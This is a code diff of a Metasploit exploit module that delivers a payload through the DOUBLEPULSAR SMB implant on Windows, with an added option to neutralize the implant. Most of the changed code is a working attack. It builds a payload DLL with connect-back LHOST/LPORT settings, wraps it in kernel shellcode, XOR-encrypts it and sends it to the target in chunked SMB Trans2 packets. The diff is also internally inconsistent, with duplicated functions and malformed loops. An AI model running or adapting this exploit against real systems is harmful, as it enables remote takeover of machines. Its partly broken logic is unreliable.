@@ -12,31 +12,47 @@ class MetasploitModule < Msf::Exploit::Remote
 
   moved_from 'exploit/windows/smb/doublepulsar_rce'
 
-
-MAX_SHELLCODE_SIZE = 4096
-
+  MAX_SHELLCODE_SIZE = 4096
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'               => 'DOUBLEPULSAR DLL Remote Code Execution',
+      'Name'               => 'SMB DLL_DOUBLEPULSAR Remote Code Execution',
       'Description'        => %q{
-        This module executes a DLL Metasploit payload against the Equation Group's
+        This module executes a Metasploit payload against the Equation Group's
         DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.
 
+        While this module primarily performs code execution against the implant,
+        the "Neutralize implant" target allows you to disable the implant.
       },
       'Author'             => [
         'Equation Group', # DOUBLEPULSAR implant
+        'Shadow Brokers', # Equation Group dump
+        'zerosum0x0',     # DOPU analysis and detection
+        'Luke Jennings',  # DOPU analysis and detection
+        'wvu',            # Metasploit module and arch detection
+        'Jacob Robles'    # Metasploit module and RCE help
       ],
       'References'         => [
         ['MSB', 'MS17-010'],
+        ['CVE', '2017-0143'],
+        ['CVE', '2017-0144'],
+        ['CVE', '2017-0145'],
+        ['CVE', '2017-0146'],
+        ['CVE', '2017-0147'],
+        ['CVE', '2017-0148'],
+        ['URL', 'https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html'],
+        ['URL', 'https://countercept.com/blog/analyzing-the-doublepulsar-kernel-dll-injection-technique/'],
+        ['URL', 'https://www.countercept.com/blog/doublepulsar-usermode-analysis-generic-reflective-dll-loader/'],
+        ['URL', 'https://github.com/countercept/doublepulsar-detection-script'],
+        ['URL', 'https://github.com/countercept/doublepulsar-c2-traffic-decryptor'],
+        ['URL', 'https://gist.github.com/msuiche/50a36710ee59709d8c76fa50fc987be1']
       ],
-     'DisclosureDate'     => '2017-04-14', # Shadow Brokers leak
+      'DisclosureDate'     => '2017-04-14', # Shadow Brokers leak
       'License'            => MSF_LICENSE,
       'Platform'           => 'win',
       'Arch'               => ARCH_X64,
       'Privileged'         => true,
       'Payload'            => {
-        'Space'            => MAX_SHELLCODE_SIZE - kernel_shellcode_size,
         'DisableNops'      => true
       },
       'Targets'            => [
@@ -104,12 +120,12 @@ MAX_SHELLCODE_SIZE = 4096
     0xff & (op - ((k & 0xffff00) >> 16) - (0xffff & (k & 0xff00) >> 8)) | k & 0xffff00
   end
 
-  def generate_doublepulsar_param(op, body, chunk_size, offset)
+  def generate_doublepulsar_param(op, body)
     case OPCODES.key(op)
     when :ping, :kill
       "\x00" * 12
     when :exec
-      Rex::Text.xor([@xor_key].pack('V'), [body.length, chunk_size, offset].pack('V*'))
+      Rex::Text.xor([@xor_key].pack('V'), [body.length, body.length, 0].pack('V*'))
     end
   end
 
@@ -149,12 +165,6 @@ MAX_SHELLCODE_SIZE = 4096
   end
 
   def exploit
-  #Generate DLL
-  print_status("Generating payload DLL for Doublepulsar")
-  pay = framework.modules.create(datastore['payload'])
-  pay.datastore['LHOST'] = datastore['LHOST']
-  pay.datastore['LPORT'] = datastore['LPORT']
-  dll = pay.generate_simple({'Format'=>'dll'})
 
     # No ForceExploit because @tree_id and @xor_key are required
     unless check == CheckCode::Vulnerable
@@ -171,14 +181,22 @@ MAX_SHELLCODE_SIZE = 4096
         fail_with(Failure::NoTarget, 'x86 is not a supported target')
       end
 
-      print_status("Generating kernel shellcode with #{datastore['PAYLOAD']}")
-      shellcode = make_kernel_user_payload(dll)
-      vprint_status("Total shellcode length: #{shellcode.length} bytes")
 
-      print_status("Encrypting shellcode with XOR key 0x#{@xor_key.to_s(16).upcase}")
-      xor_shellcode = Rex::Text.xor([@xor_key].pack('V'), shellcode)
+	#Generate DLL
+	print_status("Generating payload DLL for Doublepulsar")
+	pay = framework.modules.create(datastore['payload'])
+	pay.datastore['LHOST'] = datastore['LHOST']
+	pay.datastore['LPORT'] = datastore['LPORT']
+	dll = pay.generate_simple({'Format'=>'dll'})
 
-      print_status('Sending shellcode to DOUBLEPULSAR')
+      	print_status("Generating kernel shellcode with #{datastore['PAYLOAD']}")
+      	shellcode = make_kernel_user_payload(dll)
+      	print_status("Total shellcode length: #{shellcode.length} bytes")
+
+      	print_status("Encrypting shellcode with XOR key 0x#{@xor_key.to_s(16).upcase}")
+      	xor_shellcode = Rex::Text.xor([@xor_key].pack('V'), shellcode)
+
+      	print_status('Sending shellcode to DOUBLEPULSAR')
 
 	
 	#calculate size
@@ -187,17 +205,25 @@ MAX_SHELLCODE_SIZE = 4096
 	iterations = total_size / 4096
 	remainder = total_size % 4096
 	offset = 0
+	
+	times = 0
 	#loop through buffer sending chunks of 4096 bytes until last packet
-	loop 
-      		code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, 4096, offset)
+	until times == iterations do
+		#break if times == iterations
+      		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, 4096, offset)
 		offset += 4096
 		bytes_left -= 4096
+		times += 1
 	end 
 	if remainder > 0
 		#last packet here
-		code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, bytes_left, offset)
+		code, _signature1, _signature2 = do_exec_doublepulsar_pkt(OPCODES[:exec], xor_shellcode, bytes_left, offset)
 	else
-	print_status("DONE!")
+		print_status("DONE!")
+    	end
+
+    when 'Neutralize implant'
+      return neutralize_implant
     end
 
     case calculate_doublepulsar_status(@multiplex_id, code)
@@ -212,6 +238,18 @@ MAX_SHELLCODE_SIZE = 4096
     end
   ensure
     disconnect
+  end
+
+  def neutralize_implant
+    print_status('Neutralizing DOUBLEPULSAR')
+    code, _signature1, _signature2 = do_smb_doublepulsar_pkt(OPCODES[:kill])
+
+    case calculate_doublepulsar_status(@multiplex_id, code)
+    when :success
+      print_good('Implant neutralization successful')
+    else
+      fail_with(Failure::Unknown, 'An unknown error occurred')
+    end
   end
 
   def do_smb_setup_tree(ipc_share)
@@ -243,11 +281,11 @@ MAX_SHELLCODE_SIZE = 4096
     return pkt['SMB'].v['MultiplexID'], pkt['SMB'].v['Signature1'], pkt['SMB'].v['Signature2']
   end
 
-  def make_smb_trans2_doublepulsar(opcode, body, chunk_size, offsetCounter)
+  def make_smb_trans2_doublepulsar(opcode, body)
     setup_count = 1
     setup_data = [0x000e].pack('v')
 
-    param = generate_doublepulsar_param(opcode, body, chunk_size, offsetCounter)
+    param = generate_doublepulsar_param(opcode, body)
     data = param + body.to_s
 
     pkt = Rex::Proto::SMB::Constants::SMB_TRANS2_PKT.make_struct
@@ -281,6 +319,82 @@ MAX_SHELLCODE_SIZE = 4096
     pkt['Payload'].v['Payload'] = data
 
     pkt.to_s
+  end
+
+  # ring3 = user mode encoded payload
+  # proc_name = process to inject APC into
+  def make_kernel_user_payload(ring3)
+    sc = make_kernel_shellcode()
+
+    sc << [ring3.length].pack('S<')
+    sc << ring3
+
+    sc
+  end
+
+  def do_exec_doublepulsar_pkt(opcode, body, chunk, offset)
+    # make doublepulsar knock
+    pkt = make_exec_trans2_doublepulsar(opcode, body, chunk, offset)
+
+    sock.put(pkt)
+    bytes = sock.get_once
+
+    return unless bytes
+
+    # convert packet to response struct
+    pkt = Rex::Proto::SMB::Constants::SMB_TRANS_RES_HDR_PKT.make_struct
+    pkt.from_s(bytes[4..-1])
+
+    return pkt['SMB'].v['MultiplexID'], pkt['SMB'].v['Signature1'], pkt['SMB'].v['Signature2']
+  end
+
+  def make_exec_trans2_doublepulsar(opcode, body, chunk_size, offsetCounter)
+    setup_count = 1
+    setup_data = [0x000e].pack('v')
+
+    param = generate_exec_doublepulsar_param(opcode, body, chunk_size, offsetCounter)
+    data = param + body.to_s
+
+    pkt = Rex::Proto::SMB::Constants::SMB_TRANS2_PKT.make_struct
+    simple.client.smb_defaults(pkt['Payload']['SMB'])
+
+    base_offset = pkt.to_s.length + (setup_count * 2) - 4
+    param_offset = base_offset
+    data_offset = param_offset + param.length
+
+    pkt['Payload']['SMB'].v['Command'] = CONST::SMB_COM_TRANSACTION2
+    pkt['Payload']['SMB'].v['Flags1'] = 0x18
+    pkt['Payload']['SMB'].v['Flags2'] = 0xc007
+
+    @multiplex_id = rand(0xffff)
+
+    pkt['Payload']['SMB'].v['WordCount'] = 14 + setup_count
+    pkt['Payload']['SMB'].v['TreeID'] = @tree_id
+    pkt['Payload']['SMB'].v['MultiplexID'] = @multiplex_id
+
+    pkt['Payload'].v['ParamCountTotal'] = param.length
+    pkt['Payload'].v['DataCountTotal'] = body.to_s.length
+    pkt['Payload'].v['ParamCountMax'] = 1
+    pkt['Payload'].v['DataCountMax'] = 0
+    pkt['Payload'].v['ParamCount'] = param.length
+    pkt['Payload'].v['ParamOffset'] = param_offset
+    pkt['Payload'].v['DataCount'] = body.to_s.length
+    pkt['Payload'].v['DataOffset'] = data_offset
+    pkt['Payload'].v['SetupCount'] = setup_count
+    pkt['Payload'].v['SetupData'] = setup_data
+    pkt['Payload'].v['Timeout'] = generate_doublepulsar_timeout(opcode)
+    pkt['Payload'].v['Payload'] = data
+
+    pkt.to_s
+  end
+
+  def generate_exec_doublepulsar_param(op, body, chunk_size, offset)
+    case OPCODES.key(op)
+    when :ping, :kill
+      "\x00" * 12
+    when :exec
+      Rex::Text.xor([@xor_key].pack('V'), [body.length, chunk_size, offset].pack('V*'))
+    end
   end
 
   def make_kernel_user_payload(ring3)
